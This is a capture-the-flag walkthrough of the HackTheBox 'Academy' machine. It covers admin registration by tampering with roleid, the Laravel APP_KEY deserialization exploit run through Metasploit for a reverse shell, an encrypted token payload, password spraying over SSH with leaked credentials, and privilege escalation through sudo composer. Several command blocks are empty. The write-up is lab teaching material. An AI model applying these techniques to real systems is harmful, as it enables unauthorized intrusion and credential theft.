## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see we have only port 22 and 80 opened, so without further doing let's dig into port 80.  
Before opening port 80 we can see in nmap that the site is performing a redirection to ```Did not follow redirect to http://academy.htb/``` so let's set up this host in our /etc/hosts file and let's start enumerating web-server.  
First thing, hitting the website, we can see an 'academy' page. The page shows an image and nothing more, so, let's start enumerating the web-server looking for files and directories:  
```
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/admin.php            (Status: 200) [Size: 2633]
/login.php            (Status: 200) [Size: 2627]
/.                    (Status: 200) [Size: 2117]
/index.php            (Status: 200) [Size: 2117]
/register.php         (Status: 200) [Size: 3003]
/config.php           (Status: 200) [Size: 0]
```
as we can see we discovered various links.  
Now we can try various scan, but at least, if we try to register a new account with the roleid (found in the registration request set to 1) we can register an admin account.  
```
POST /register.php HTTP/1.1

```
After we register the account we can login with the given credentials to admin.php, here we can find the below: 
![](Attachments/Pasted%20image%2020220518104752.png)
As we can see here the site disclose information regarding an additional domain in the site ```dev-staging.academy.htb``` so now we can start enumerate this virtualhost.  
As we open this site we can see that it shows an error message disclosing interesting information. 
As we can notice the site is running on top of laravel which is a php framework, so let's look for available exploits for laravel.

As we can see there are plenty of exploits available.
## Foothold
Let's start with the metasploit module ```PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)```.    
as we can test if we set all the parameters:  
```

```
The ```APP_KEY``` value can be retriven from the error dump we previously saw in the ```dev-staging.academy.htb``` error page.  
Now, if we run the exploit:  
```
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

web.config    
```
we get a reverseshell as www-data. Now, as always when dealing with metasploit, let's try to analyse what the script is doing.  
As we can see in burp, the only thing it is doing actually is to send a base64 encoded payload in the X-XSRF-TOKEN header:  
```
{"iv":"SZXUno+UD5VJju97b65jJg==","value":"0q2roAGO0A7HNZZD\/AA3VikB9LmaR7NHeJd\/wg2ZNxQM+zPoi5X7X8ggolGfuEx\/NhRd0Yin7HwoapawMIAvCQ2pkqd+6H1vGlbgHoZ1Wo2CN+EcvbVWpPsCUc1p\/rO9HwC5D2owSgbFGIv3QPRxlJKcqc55YAHrj9jlYedaXVlMm29H+RP1j\/CF71cA8GBgIzspWWPgf6GfxDEuadEBw80RchAr8bHAeLojedW2COxI03cPloUORb81cRBYBvKzaCfYRzyXO53H7KTMLgCuPQjXtDNwO5Y3eUeSfovpaBBlCbXNitgXO1YNJGjVE2aMPeRYEnTuw0I\/0lT6ki6VunTzXmM6Vf0xXQYWsYfhcqkOXa8EFqoY\/SkY+1Nit+TtW5d37SSAssR1qLJr04Bd\/0ZD5OKg4ppO0tyhffyrxhRwWs0MdGTLtZz7TWZSuEO0nCZg5eMpUYWCcUMvGyWMc1fwOIsb3TteutG3HIEgi25GpegArFtYZjKQpZfPCCDmxb2bZmXKffyl0XpuSlJL3TS58tg0HbBgd+ZIVT1Oih4=","mac":"82eb4dadea7f73084cecaf12bee5e948f7af338142da4cdca276688fd614dfe4"}
```
The decoded payload contains: iv, value, mac. Hence, we can assume that this is the result of some form of encryption. Since the exploit asks for APP_KEY value, we can assume that this is the key for the encryption.  
Poking around on google for this CVE, we can find [this gitub repo](https://github.com/kozmic/laravel-poc-CVE-2018-15133/blob/master/cve-2018-15133.php) of a dude that created a script for crafting a payload.  
As we can confirm APP_KEY is used as encryption key for the value field, so now we can go to [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'Base64','string':'dBLUaMuZz7Iq06XtL/Xnz/90Ejq%2BDEEynggqubHWFj0%3D'%7D,%7B'option':'Base64','string':'SZXUno%2BUD5VJju97b65jJg%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=dFFvSVY5dVZ4T3AzR2RwUGEyNWRlb2o0RlpzQXBFVmp0cHk0czlwcVkyTHRlM0M1cyswVlMwWHlRWTBiQmVpTXozR3UwK1M0SVFIOGpadEhXYWVRcGxWbEJzUE9DV2pQdjlicFhwdWRGTElFMHdJeGNaUzJSZU5VZE1MaDVhNXUwVXpcL3k3YnZJUUZtdUdoRlhNMmRKa3JTQm5SbnJVdHJmK01EdVZ3YWFhNWNVaExnTzJjUEdkV1hMZHEwS2p2b0tIdFhPSUZ3RHpNb0JNRDlrSUg0M0lKemtXeGhEZDZlY3libDFDYUxNeHpaMHozSnBFemNMcE1rY1NjUkx1czZ3XC93K0tycWdqczluekV6R0dac1NtSXhRVEJLNlUwSDB6UGd1eXN1YmVxQUhGeHd3MTFXc2tCNlpZRVhoODcwQzUyZFE1N0Q5TVN0bkVFOGI1cnRvbmF0OGFXYmlDSmpCM2l0KzM0Z1ZPOVN0VkV4V0ZBaCtcL2pzZnMxSkhvMEdsODZ3UlZrcm9zTGFuSkE5OTdKbVF5SFB4bDczMmY4XC9VSlN0djNDSFN0eDFDeVQ3VStXUEJkd240VGpXRFM3ZFJyUnBtSGxkMVcyN3k0YjR0eXk3Q2VRPT0) and try to decode the value field. As we open the previously pasted link we can see the recepie, however, all we need to do is decode from base64 and decrypt from AES-256-CBC with base64 iv/key and raw input.  
and we will get the following perl payload.
```

```
**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
- Write complex data to inter-process memory, a file, or a database
- Send complex data, for example, over a network, between different components of an application, or in an API call
Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.
Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an "object injection" vulnerability.
An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.
More info related to unsecure deserialization can be found [here](https://portswigger.net/web-security/deserialization)

## User
After having an initial foothold on the server let's look for credentials inside code.  
After few greps for 'pass' keyword we can find an env file containing a new set of credentials:  
```
www-data@academy:/var/www/html/academy$ cat .env           
[... SNIP ...]                                        
DB_PASSWORD=mySup3rP4s5w0rd!!                              
[... SNIP ...]
```
Now let's try this creds against the machine and see if this is affected by a password reuse vulnerability.  
Before doing so, we need to download a list of users of this box since we have more than one:
```
egre55
mrb3n
cry0l1t3
21y4d
ch4p
g0blin
```
Now we can use crackmapexec to test the newly discovered password against all this users:  
```
[root@kali Academy ]$ crackmapexec ssh 10.10.10.215 -u system_users.txt -p 'mySup3rP4s5w0rd!!'                                                                                                                                               
SSH         10.10.10.215    22     10.10.10.215     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1                       
SSH         10.10.10.215    22     10.10.10.215     [-] egre55:mySup3rP4s5w0rd!! Authentication failed.               
SSH         10.10.10.215    22     10.10.10.215     [-] mrb3n:mySup3rP4s5w0rd!! Authentication failed.                
SSH         10.10.10.215    22     10.10.10.215     [+] cry0l1t3:mySup3rP4s5w0rd!!    
```
As we can see this password can be used for user cry0l1t3
```
[root@kali repos ]$ ssh -l cry0l1t3 $TARGET

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that cry0l1t3 user is part of adm group and hence he can read logs
```

As we have seen in [Doctor.htb](Doctor.md) having a user inside this group can be dangerous because most likey, also in a real world scenario, logs will contain password, hece let's dig int /var/log.  
After poking around for a while we can notice an audit directory.  
Now we can use ```aureport``` in order to grab info and statistics from the audit logs.

enumerating flags of ```aureport``` we can use the ```--tty``` flag:

```
And here we can find a password ```mrb3n:mrb3n_Ac@d3my!``` for another user.  
Once we swich to that user, intuitively, we can run a ```sudo -l```, provide the password and we will see the following:  
```
mrb3n@academy:~$ sudo -l                                             
[sudo] password for mrb3n:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User mrb3n may run the following commands on academy:      
    (ALL) /usr/bin/composer  
```
Now, all we have to do is search for [GTFOBins for composer](https://gtfobins.github.io/gtfobins/composer/) and run the privilege escalation commands:  
```
